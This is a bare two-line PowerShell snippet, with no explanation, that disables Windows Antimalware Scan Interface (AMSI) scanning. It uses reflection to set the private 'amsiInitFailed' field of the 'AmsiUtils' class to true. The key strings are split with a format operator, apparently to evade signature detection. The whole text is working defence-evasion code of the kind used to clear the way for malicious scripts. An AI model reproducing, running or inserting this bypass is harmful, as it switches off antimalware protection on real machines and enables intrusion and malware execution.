$a='si'
[Ref].Assembly.GetType(('System.Management.Automation.Am{0}Utils' -f $a)).GetField(('am{0}InitFailed' -f $a), 'NonPublic,Static').SetValue($null,$true)
